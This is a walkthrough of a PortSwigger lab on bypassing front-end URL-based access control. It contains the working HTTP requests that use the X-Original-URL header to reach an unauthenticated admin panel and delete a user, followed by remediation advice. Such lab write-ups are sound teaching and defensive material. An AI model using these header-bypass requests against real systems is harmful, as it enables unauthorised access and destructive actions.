# Lab: URL-Based Access Control Can Be Circumvented

| | |
|---|---|
| **Platform** | PortSwigger Web Security Academy |
| **Category** | Access Control Vulnerabilities |
| **Difficulty** | Practitioner |
| **Vulnerability** | Access control bypass via front-end/back-end routing mismatch (`X-Original-URL` header) |
| **Objective** | Access the admin panel and delete the user `carlos` |
| **Tools used** | Firefox, Burp Suite (Proxy, Repeater) |

---

## 1. Challenge Description

The lab description states:

> This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.
>
> To solve the lab, access the admin panel and delete the user `carlos`.

<img width="1529" height="784" alt="image" src="https://github.com/user-attachments/assets/542c765d-704e-45e0-996c-260401f66240" />

Unlike the earlier labs in this series, the vulnerability here isn't about discovering a hidden path or forging a role value. The lab tells me outright that `/admin` is unauthenticated on the back end, but a **front-end system** (such as a reverse proxy or load balancer) blocks direct requests to it. The challenge is to reach the back end **without the front end recognising the request as going to `/admin`**.

---

## 2. Recon

The home page already displays an **Admin panel** link in its navigation, alongside **Home** and **My account**. This confirms the application itself assumes a visitor can reach `/admin` once authorised, but says nothing about how the front-end filtering works.

<img width="1530" height="784" alt="image" src="https://github.com/user-attachments/assets/0fd615ef-017b-4d98-ba25-7369fd9fdef5" />

### Step 1: Try the admin panel directly

Clicking the **Admin panel** link sends a request to `/admin`. The response was:

```json
"Access denied"
```

<img width="1530" height="784" alt="image" src="https://github.com/user-attachments/assets/7e86ca46-ca04-455f-82af-9144b3ccdd7c" />

This confirms the front-end block described in the lab: something in front of the application is inspecting the request path and rejecting any request where the **path itself** is `/admin`.

---

## 3. Vulnerability Analysis

The lab description names the exact mechanism to exploit: the back-end framework honours an `X-Original-URL` header, which some frameworks use so that a front-end proxy can tell the back end the "real" path it should treat the request as targeting (commonly used for rewriting or internal routing). The flaw is a **mismatch in what each layer checks**:

- The **front-end** (reverse proxy / WAF-like filter) only inspects the literal request-line path (`GET /admin`), and blocks it.
- The **back-end** application trusts the `X-Original-URL` header to decide which route/controller actually handles the request, and does **not** re-validate that header against the same access-control rule applied to the path.

So, a request whose path is something innocuous like `/` (which the front end allows) but which carries `X-Original-URL: /admin` sails past the front-end filter, and the back end then processes it **as if the path were `/admin`**, with no authentication or authorization check of its own.

This is a textbook example of an access control bypass caused by **inconsistent enforcement across two layers that disagree about where "the URL" actually is**.

---

## 4. Exploitation

### Step 1: Confirm the header bypasses the front-end block

I captured a request in Burp Suite, sent it to **Repeater**, and modified it to target the home page path (`/`) while adding the header:

```http
GET / HTTP/2
Host: <LAB-ID>.web-security-academy.net
X-Original-Url: /admin
Cookie: session=HGf3UVQ7B4G8X6JKtnzFyuytKoTqXjyY
```

The response was no longer "Access denied." Instead, it returned the full admin panel HTML, listing both users with delete links:

```html
<a href="/admin">Admin panel</a>
...
<h1>Users</h1>
wiener - <a href="/admin/delete?username=wiener">Delete</a>
carlos - <a href="/admin/delete?username=carlos">Delete</a>
```

<img width="1532" height="784" alt="image" src="https://github.com/user-attachments/assets/d2c27d77-f60e-4cf0-a287-9f879aa471e5" />

This confirmed the bypass: the front end only ever saw a request to `/`, while the back end actually served `/admin`.

### Step 2: Turn the GET request into the delete action

The admin panel's delete links point to `/admin/delete?username=<name>`. Rather than issuing a `GET` to that path directly (which the front end would also block, since the path still contains `/admin`), I kept the request path as `/` and changed the `X-Original-URL` header and method to match how the delete action is actually submitted:

```http
POST / HTTP/2
Host: <LAB-ID>.web-security-academy.net
X-Original-Url: /admin/delete?
Cookie: session=HGf3UVQ7B4G8X6JKtnzFyuytKoTqXjyY
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

username=carlos
```

### Step 3: Confirm the deletion

The server responded:

```http
HTTP/2 302 Found
Location: /admin
```

A `302` redirect back to `/admin` confirmed the deletion was processed successfully.

<img width="1533" height="784" alt="image" src="https://github.com/user-attachments/assets/9295ccab-82d2-4d07-98fc-fe0f803ed453" />

### Step 4: Confirm in the browser

I reloaded the application in Firefox. The lab banner changed to **Solved**, with the confirmation banner *"Congratulations, you solved the lab!"*, and the **Admin panel** link was now reachable from the normal navigation as well.

<img width="1532" height="784" alt="image" src="https://github.com/user-attachments/assets/d6574e1b-5bee-4571-bbd6-e84170bf1911" />

---

## 5. Result

| Check | Status |
|---|---|
| Direct `GET /admin` blocked with "Access denied" | Confirmed |
| `X-Original-Url: /admin` header bypasses the front-end block | Done |
| Full admin panel retrieved via the header trick | Done |
| Delete action triggered via `POST /` + `X-Original-Url: /admin/delete?` | Done |
| User `carlos` deleted (`302 Found` to `/admin`) | Done |
| Lab status | **Solved** |

---

## 6. Impact

This class of flaw lets an attacker reach functionality that is explicitly meant to be blocked at the network edge:

- Any access control enforced only at the front-end/proxy layer, and not re-validated by the application itself, can be bypassed by any header the back end happens to trust for routing (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-*`, etc.).
- In this lab, that meant reaching a completely unauthenticated admin panel and performing destructive actions (deleting user accounts) with no credentials at all.
- In a production environment, this pattern has been used to bypass WAF rules, internal-only API restrictions, and IP allow-listing that only inspects the literal request path.

---

## 7. Remediation

1. **Never rely solely on a front-end component (proxy, load balancer, WAF) to enforce access control.** The back-end application must independently authenticate and authorize every sensitive request, regardless of how it was routed internally.
2. **Disable or strip routing-override headers** such as `X-Original-URL` and `X-Rewrite-URL` at the perimeter, unless they are strictly required, and never let user-supplied values populate them.
3. **If internal routing headers are necessary**, ensure the same access-control checks that would apply to the literal path are also applied to the resolved path from the header, before the request reaches a privileged handler.
4. **Apply defense in depth:** enforce authentication/authorization at every layer (edge, gateway, application), not just one.
5. **Audit framework-level "convenience" features** (like honouring `X-Original-URL` for internal rewrites) for unintended security implications before deploying them in production.

---

## 8. Key Takeaways

- When a lab (or a real target) names a specific header, like `X-Original-URL`, treat it as a direct exploitation primitive to test, not just background detail.
- Access control implemented at a proxy/front-end layer is only as strong as the back end's agreement on *what the URL actually is*. Any header that lets the back end resolve a different path than the one the front end inspected is a potential bypass.
- Once a GET-based bypass works, the same header can often be reused with a different HTTP method and body to reach state-changing endpoints (here, turning a `GET /admin/delete?username=...` link into a `POST` with a form body).
- Burp Repeater is well suited to this kind of header-and-method manipulation: capture once, then iterate quickly on headers, method and body independently.

---

## 9. References

- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- [PortSwigger: URL-based access control](https://portswigger.net/web-security/access-control#url-based-access-control-can-be-circumvented)
- [OWASP: Server-Side Request Forgery and header-based routing pitfalls](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
